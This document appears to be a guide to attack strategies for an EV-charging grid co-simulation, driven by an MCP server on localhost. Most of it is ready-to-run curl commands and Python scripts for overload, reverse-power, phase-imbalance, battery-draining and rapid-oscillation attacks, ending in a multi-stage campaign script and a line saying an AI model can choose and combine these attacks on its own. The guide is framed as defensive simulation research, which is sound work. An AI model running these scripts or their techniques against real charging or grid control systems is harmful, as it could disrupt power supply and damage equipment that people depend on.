# EV Setpoint Attack Strategies Guide

## Overview

This document describes adversarial attack strategies available through the EV Setpoint MCP server for defensive cybersecurity research on the 2bus-13bus grid co-simulation.

---

## Attack Surface Analysis

### Target Infrastructure
- **6 EV Charging Stations** on IEEE 123-bus distribution feeder
- **Legitimate Controller**: Python-based peak-shaving controller (1bc_EV_Controller.py)
- **Protection Limits**: 4.2 MW upper / 2.6 MW lower feeder load thresholds
- **Storage Systems**: EV1 and EV4 connected to battery storage for islanding

### EV Station Details

| EV ID | Phase | Normal Max | Attack Max | Storage | Upstream Link |
|-------|-------|------------|------------|---------|---------------|
| EV1   | CN    | 220 kW     | 4 MW       | Yes     | l5            |
| EV2   | BN    | 200 kW     | 4 MW       | No      | l2            |
| EV3   | AN    | 200 kW     | 4 MW       | No      | l88           |
| EV4   | CN    | 220 kW     | 4 MW       | Yes     | l92           |
| EV5   | BN    | 200 kW     | 4 MW       | No      | l107          |
| EV6   | AN    | 200 kW     | 4 MW       | No      | l114          |

---

## Attack Strategies

### 1. Simple Overload Attack
**Objective**: Exceed feeder load limits to trigger protection systems

**Method**:
- Inject excessive load on multiple EVs simultaneously
- Total load > 4.2 MW triggers upper limit protection
- Legitimate controller will attempt islanding with storage

**Example**:
```bash
# Attack EV3 and EV5 with 2 MW each (total 4+ MW)
curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV3","real_power_kw":2000}}'

curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV5","real_power_kw":2500}}'
```

**Expected Impact**:
- Feeder load exceeds 4.2 MW threshold
- Legitimate controller opens grid switches for EV1 and EV4
- EV1 and EV4 island with battery storage
- Other EVs disconnected to protect feeder

---

### 2. Reverse Power Injection Attack
**Objective**: Disrupt power flow direction to cause protection misoperation

**Method**:
- Send negative setpoints to inject power back into grid
- Simulates EV-to-Grid (V2G) attack or inverter manipulation
- Can cause directional relay confusion

**Example**:
```bash
# Inject -500 kW on EV1 (reverse power flow)
curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV1","real_power_kw":-500}}'
```

**Expected Impact**:
- Reverse power flow on distribution feeder
- Voltage rise at EV connection point
- Potential transformer reverse power flow
- Protection relay confusion (designed for unidirectional flow)

---

### 3. Phase Imbalance Attack
**Objective**: Create voltage imbalance across three phases

**Method**:
- Target EVs on different phases with asymmetric loads
- Phase A (EV3, EV6), Phase B (EV2, EV5), Phase C (EV1, EV4)
- Create maximum load on one phase, minimum on others

**Example**:
```bash
# Heavy load on Phase C (EV1 + EV4)
curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV1","real_power_kw":3500}}'

curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV4","real_power_kw":3500}}'

# Minimal load on Phase A and B
curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV3","real_power_kw":50}}'
```

**Expected Impact**:
- Severe voltage imbalance across phases
- Phase C voltage drop significantly
- Neutral current increase
- Potential three-phase equipment malfunction

---

### 4. Timing-Based Attack (Peak Demand Exploitation)
**Objective**: Attack during peak hours (15:00-17:00) when grid is stressed

**Method**:
- Monitor feeder load via `get_grid_status` primitive
- Wait until legitimate load approaches 3.5-4.0 MW
- Inject additional load to push over 4.2 MW limit

**Example**:
```python
import requests
import time

def monitor_and_attack():
    while True:
        # Observe current load
        resp = requests.post("http://localhost:5100/primitive",
                           json={"method": "get_grid_status", "params": {}})
        grid = resp.json()

        # Calculate total feeder load
        total_kw = sum([
            grid["grid_state"]["powers"]["gld_power_Sa"]["real_kw"],
            grid["grid_state"]["powers"]["gld_power_Sb"]["real_kw"],
            grid["grid_state"]["powers"]["gld_power_Sc"]["real_kw"]
        ])

        print(f"Current feeder load: {total_kw:.1f} kW")

        # If approaching limit, attack!
        if total_kw > 3500:
            print("ATTACKING: Grid stressed, injecting overload")
            requests.post("http://localhost:5100/primitive",
                        json={"method": "set_ev_capacity",
                              "params": {"ev_id": "EV5", "real_power_kw": 2000}})
            break

        time.sleep(10)

monitor_and_attack()
```

**Expected Impact**:
- Attack timing maximizes grid stress
- Legitimate controller forced to emergency response
- Higher probability of cascading failures
- Storage systems may be depleted during islanding

---

### 5. Storage Exploitation Attack
**Objective**: Drain battery storage during islanding to leave grid vulnerable

**Method**:
- Trigger overload to force EV1/EV4 islanding with storage
- Once islanded, inject maximum load on EV1 and EV4
- Deplete batteries so they can't support future attacks

**Example**:
```bash
# Step 1: Trigger islanding
curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV3","real_power_kw":3000}}'

# Wait for islanding to occur (controller opens grid switches)
sleep 30

# Step 2: Maximum drain on islanded EVs
curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV1","real_power_kw":220}}'

curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV4","real_power_kw":220}}'
```

**Expected Impact**:
- Battery storage rapidly depletes
- Future islanding capability degraded
- Grid becomes vulnerable to sustained overload
- EV1/EV4 may lose power when batteries empty

---

### 6. Reactive Power Attack
**Objective**: Cause voltage issues through excessive reactive power injection

**Method**:
- Inject large reactive power (Q) while maintaining real power (P)
- Can cause voltage rise or drop depending on sign
- Affects power factor and transformer loading

**Example**:
```bash
# Inject reactive power to raise voltage
curl -X POST http://localhost:5100/primitive -H "Content-Type: application/json" \
  -d '{"method":"set_ev_capacity","params":{"ev_id":"EV6","real_power_kw":500,"reactive_power_kvar":800}}'
```

**Expected Impact**:
- Local voltage rise/drop at EV connection
- Power factor degradation
- Transformer overheating (apparent power increase)
- Voltage regulator confusion

---

### 7. Rapid Setpoint Fluctuation Attack
**Objective**: Create instability through rapid load changes

**Method**:
- Send setpoint commands faster than legitimate controller (every 1-5 seconds)
- Alternate between high and low setpoints
- Causes continuous power flow oscillations

**Example**:
```python
import requests
import time

for i in range(60):  # 60 cycles of oscillation
    high = {"method": "set_ev_capacity",
            "params": {"ev_id": "EV2", "real_power_kw": 2000}}
    low = {"method": "set_ev_capacity",
           "params": {"ev_id": "EV2", "real_power_kw": 50}}

    requests.post("http://localhost:5100/primitive", json=high)
    time.sleep(2)
    requests.post("http://localhost:5100/primitive", json=low)
    time.sleep(2)
```

**Expected Impact**:
- Continuous feeder load oscillations
- Voltage fluctuations
- Control system instability
- Potential SCADA alarm flooding

---

### 8. Coordinated Multi-Stage Attack Campaign
**Objective**: Sophisticated attack combining multiple strategies

**Stages**:
1. **Reconnaissance** (0-60s): Monitor grid state via observation primitives
2. **Preparation** (60-120s): Identify vulnerable EVs and timing
3. **Initial Strike** (120-180s): Trigger overload to force islanding
4. **Exploitation** (180-300s): Attack storage systems during islanding
5. **Cascading** (300-360s): Rapid fluctuations to prevent recovery

**Example**:
```python
import requests
import time

API = "http://localhost:5100/primitive"

# Stage 1: Reconnaissance
print("Stage 1: Reconnaissance")
resp = requests.post(API, json={"method": "discover_topology", "params": {}})
topology = resp.json()

resp = requests.post(API, json={"method": "get_grid_status", "params": {}})
grid_state = resp.json()

print(f"Vulnerable points: {topology['vulnerabilities']['weak_points']}")

time.sleep(30)

# Stage 2: Initial overload
print("Stage 2: Overload attack to trigger islanding")
requests.post(API, json={"method": "set_ev_capacity",
                        "params": {"ev_id": "EV3", "real_power_kw": 2500}})
requests.post(API, json={"method": "set_ev_capacity",
                        "params": {"ev_id": "EV5", "real_power_kw": 2000}})

time.sleep(60)

# Stage 3: Storage exploitation
print("Stage 3: Drain islanded batteries")
requests.post(API, json={"method": "set_ev_capacity",
                        "params": {"ev_id": "EV1", "real_power_kw": 220}})
requests.post(API, json={"method": "set_ev_capacity",
                        "params": {"ev_id": "EV4", "real_power_kw": 220}})

time.sleep(60)

# Stage 4: Cascading instability
print("Stage 4: Rapid fluctuations")
for i in range(20):
    requests.post(API, json={"method": "set_ev_capacity",
                            "params": {"ev_id": "EV2", "real_power_kw": 2000}})
    time.sleep(3)
    requests.post(API, json={"method": "set_ev_capacity",
                            "params": {"ev_id": "EV2", "real_power_kw": 100}})
    time.sleep(3)

print("Attack campaign complete")
```

**Expected Impact**:
- Comprehensive grid disruption
- Multiple protection activations
- Storage systems compromised
- Extended recovery time required
- Maximum stress on grid operators

---

## Defense Analysis

For each attack strategy, defensive countermeasures should be evaluated:

1. **Detection**: Can the legitimate controller detect the attack?
2. **Response Time**: How quickly can defenses respond?
3. **Mitigation**: What control actions can neutralize the attack?
4. **Recovery**: How long to restore normal operation?

Use the `output/interaction_log.jsonl` to analyze attack effectiveness and develop defensive strategies.

---

## Ethical Guidelines

**IMPORTANT**: This attack framework is designed for **defensive cybersecurity research only**:
- Use only in isolated simulation environments
- Never target real grid infrastructure
- All findings used to improve grid defenses
- Maintain detailed audit logs
- Follow responsible disclosure for vulnerabilities discovered

---

## Attack Success Metrics

Monitor these indicators to evaluate attack effectiveness:

1. **Feeder Load Threshold Violation**: Load > 4.2 MW or < 2.6 MW
2. **Protection Activation Count**: Number of switch operations
3. **Voltage Deviation**: Voltages outside 0.95-1.05 pu
4. **Storage Depletion Rate**: Battery discharge during islanding
5. **Recovery Time**: Time to restore normal operation after attack
6. **Cascading Failures**: Secondary outages triggered by initial attack

---

*For AI-driven attack campaigns, the AI model can autonomously select and combine these strategies based on observed grid state and attack objectives.*
